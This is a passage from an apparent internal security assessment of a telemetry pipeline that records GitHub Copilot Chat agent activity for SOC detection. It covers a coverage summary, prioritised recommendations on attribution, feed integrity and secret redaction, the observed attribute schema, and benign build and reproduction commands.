highest-risk capabilities are therefore *harder* to alert on than a routine file read.

**Remediation (owned by us, no product change needed):**
- Treat `gen_ai.tool.call.arguments` as authoritative for destinations, URLs, exact matches,
  command hashing, and any pattern anchored at the end of a string.
- Use `tool.parameters.command` only for cheap indexed prefix/keyword alerting.
- Alert on `tool.parameters.command` being **exactly 256 characters** — the truncation
  fingerprint.
- Normalise the non-shell tools' arguments into flat fields in the collector or SIEM ingest, so
  detection coverage does not depend on which tools GitHub happened to add convenience attributes
  for.

## 7. Coverage summary

| Requirement area | Coverage | Notes |
|---|---|---|
| Action record (§4.3) | **Strong** | Best-in-class; full commands, arguments, results and file content |
| Data exposure (§4.5) | **Strong**, less secret detection | Content and volume well covered; D5 absent |
| Human control (§4.4) | **Weak** | Risk verdict present; approval state entirely absent |
| Attribution (§4.1) | **Absent** | No identity, no device |
| Locus (§4.2) | **Good** (corrected) | Repo, branch, commit and org emitted in git-backed workspaces; visibility/classification still absent |
| Instruction provenance (§4.6) | **Weak** | Carrier visible, provenance unlabelled |
| Control plane (§4.7) | **Partial** | Version yes, change events no |
| Evidentiary integrity (§4.8) | **Weak** | User-disableable, unauthenticated, no gap detection |
| Operational fitness (§4.9) | **Partial** | Latency and volume both need work |

**Overall.** Glasseye is a capable *action recorder* and a poor *attribution and assurance system*.
It answers "what did an agent do" in more detail than most commercial tooling. It cannot currently
answer "who did it", "on what code", "did a human approve it", or "is this record trustworthy" —
and those four questions gate the entire incident response process.

---

## 8. Recommendations

Ordered by response impact per unit of effort.

### Priority 1 — restore attribution *(G1, G2, G8)*

Two mechanisms are available and were both verified against extension v0.51.0. They are
complementary, not alternatives.

**1a. Client-side, at source — `OTEL_RESOURCE_ATTRIBUTES` (preferred).**
The extension parses this standard OTel environment variable and merges it into the resource
block of every span, log and metric:

```js
_ = CDi(e.OTEL_RESOURCE_ATTRIBUTES);
resourceFromAttributes({ "service.name": …, "service.version": …,
                         "session.id": …, ...this.config.resourceAttributes })
```

Setting it in the environment VS Code inherits therefore attributes the telemetry at source:

```
OTEL_RESOURCE_ATTRIBUTES=enduser.id=<github-login>,host.name=<asset>,service.namespace=<org>
```

This is the only mechanism that works once the collector is centralised, because a collector
serving many endpoints cannot otherwise tell one user's traffic from another's. VS Code must be
fully restarted, not merely window-reloaded, to pick up a changed environment.

**1b. Collector-side — `resource` processor with `${env:...}` (implemented and verified).**
Where the client environment cannot be controlled, the already-compiled `resourceprocessor`
stamps the same attributes from the collector's own environment, with **no rebuild required**.
This is implemented in `config.local.yaml` as `resource/identity` and confirmed working —
the resource block now reads:

```
service.name   = copilot-chat
client.address = 127.0.0.1
enduser.id     = jrrbailey1        <- added by resource/identity
host.name      = BIFROST           <- added by resource/identity
```

Source the login authoritatively (`gh api user --jq .login`) rather than from `git config
user.name`, which is a display name and need not match the GitHub account.

**Important limitation.** Both mechanisms close the *data-model* gap (G1, G2) but neither closes
the *assurance* gap (G3): an environment variable set on the monitored endpoint is still
modifiable by a determined local user. Values must be injected by endpoint management, and the
resulting identity treated as reliable for attribution of ordinary activity, not as evidence
against an adversarial insider. Sequence Priority 2 accordingly.

**1c. Repository context (G8) — no action required beyond validation.** Copilot already emits
`github.copilot.git.repository`, `git.branch`, `git.commit_sha` and `github.org`, populated from
the VS Code Git extension. They were absent from the test capture only because the scratch
workspace was not a git repository. Confirm in a git-backed workspace, then join
`github.copilot.git.repository` to your repository inventory to resolve visibility and data
classification, which Copilot does not emit.

### Priority 2 — make the feed trustworthy *(G3, G11, G14)*

4. Move the collector off the monitored endpoint, or run it as a service the user cannot stop.
   Bind the receiver to loopback only (`config.local.yaml` already demonstrates this) and require
   authentication if it is ever centralised.
5. Add a `sending_queue` with the `file_storage` extension so data survives restarts and outages.
6. Implement a heartbeat and an expected-agent inventory so absence of telemetry is itself
   detectable.
7. Treat `otel.enabled = false` as a policy violation, enforced and monitored from the endpoint
   management side rather than from within Copilot.

### Priority 3 — get the existing data to the SOC *(G5, G6)*

8. Add `googlecloudpubsub` to the `logs` pipeline. The structured log events are the highest-value,
   lowest-volume part of the feed and currently never leave the machine. This is a one-line change
   with the largest single ratio of detection value to effort in this document.
9. Correct the `filter/soc` condition to retain `panel/editAgent` spans, or explicitly document the
   reasoning chain as out of scope and accept the T4 blind spot.
10. Route metrics centrally to support volumetric baselining (D4).

### Priority 4 — control content risk and volume *(G9, G12)*

11. Insert a redaction/detection stage ahead of the Pub/Sub exporter — at minimum secret-pattern
    matching over `gen_ai.input.messages`, `tool.call.arguments` and `tool.call.result`.
12. Emit `gen_ai.tool.definitions` and `gen_ai.system_instructions` once per session rather than
    per span; this roughly halves volume while preserving the capability inventory.
13. Configure file exporter rotation and define a retention period tied to the investigation window.
14. Assign a named owner and access-control model to the capture store.

### Priority 5 — raise the ceiling *(G4, G7, G13)*

15. Approval telemetry (G4) is not currently emitted by Copilot and cannot be added collector-side.
    Raise it with GitHub as a product requirement; it is the highest-value missing field after
    identity.
16. Pair this pipeline with network egress telemetry and the GitHub organisation audit log, joining
    on `copilot_chat.server_request_id` / `gen_ai.response.id`.
17. Track instruction-file contents (`copilot-instructions.md`, `AGENTS.md`) through existing
    source-control review rather than through this pipeline.

---

## Appendix A — Observed attribute schema (Copilot v0.51.0)

**Resource** — `service.name`, `service.version`, `session.id`

**Identity, device, repository** — *none present*

**Span attributes**

```
gen_ai.operation.name          invoke_agent | chat | execute_tool
gen_ai.agent.name              GitHub Copilot Chat | panel/editAgent |
                               copilotLanguageModelWrapper | progressMessages | title
gen_ai.provider.name           github
gen_ai.request.model           gen_ai.response.model         gen_ai.request.max_tokens
gen_ai.request.temperature     gen_ai.request.top_p          gen_ai.response.finish_reasons
gen_ai.response.id             gen_ai.conversation.id
gen_ai.input.messages          gen_ai.output.messages        gen_ai.system_instructions
gen_ai.tool.name               gen_ai.tool.type              gen_ai.tool.description
gen_ai.tool.call.id            gen_ai.tool.call.arguments    gen_ai.tool.call.result
gen_ai.tool.definitions
gen_ai.usage.input_tokens      gen_ai.usage.output_tokens
gen_ai.usage.cache_read.input_tokens                         gen_ai.usage.reasoning_tokens
github.copilot.agent.type      github.copilot.tool.parameters.command
github.copilot.tool.parameters.file_path                     github.copilot.tool.parameters.edit_type
copilot_chat.user_request      copilot_chat.chat_session_id  copilot_chat.parent_chat_session_id
copilot_chat.server_request_id copilot_chat.turn_count       copilot_chat.request.options
copilot_chat.request.shape     copilot_chat.reasoning_content
copilot_chat.time_to_first_token                             copilot_chat.copilot_usage_nano_aiu
```

**Log events** — `copilot_chat.session.start`, `copilot_chat.agent.turn` (`turn.index`),
`copilot_chat.tool.call` (`success`, `duration_ms`, `gen_ai.tool.name`),
`gen_ai.client.inference.operation.details`

**Metric instruments** — `copilot_chat.session.count`, `copilot_chat.agent.turn.count`,
`copilot_chat.agent.invocation.duration`, `copilot_chat.tool.call.count`,
`copilot_chat.tool.call.duration`, `copilot_chat.time_to_first_token`,
`gen_ai.client.operation.duration`, `gen_ai.client.token.usage`

## Appendix B — Reproducing the capture

```powershell
# 1. Build
cd glasseye\collector; go build -mod=vendor -o glasseye.exe .; cd ..

# 2. Run the local test pipeline (no GCP dependency)
.\collector\glasseye.exe --config config.local.yaml

# 3. VS Code user settings, then Developer: Reload Window
#    github.copilot.chat.otel.enabled           = true
#    github.copilot.chat.otel.exporterType      = otlp-http
#    github.copilot.chat.otel.otlpEndpoint      = http://localhost:4318
#    github.copilot.chat.otel.captureContent    = true
#    github.copilot.chat.otel.maxAttributeSizeChars = 0

# 4. Drive an agent-mode session, then analyse
.\flatten.ps1 -Path .\agent-traffic.json
.\to-xlsx.ps1 -Path .\agent-traffic.json -Out .\copilot-spans.xlsx
```

> **Handling note.** `agent-traffic*.json`, `copilot-spans*.csv` and `copilot-spans*.xlsx` contain
> verbatim prompts, source code and command output. Treat them at the classification of the most
> sensitive repository the agent has touched.
